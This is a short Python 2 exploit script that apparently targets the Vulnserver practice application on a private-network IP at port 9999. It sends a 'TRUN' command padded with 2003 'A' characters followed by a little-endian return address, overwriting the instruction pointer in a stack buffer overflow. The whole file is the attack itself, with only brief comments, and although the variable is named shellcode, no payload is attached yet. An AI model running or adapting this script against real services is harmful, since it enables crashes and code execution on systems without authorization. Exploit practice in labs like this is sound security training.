#! /usr/bin/python

import sys, socket 

# Enter the no of bytes 
#for example if the address as like : 625011af
#this is due to little endian architecture 

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.29.241' , 9999)) # windows ip and port to be given in 

	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:

	print "Error connecting to the server "	
	sys.exit()

		
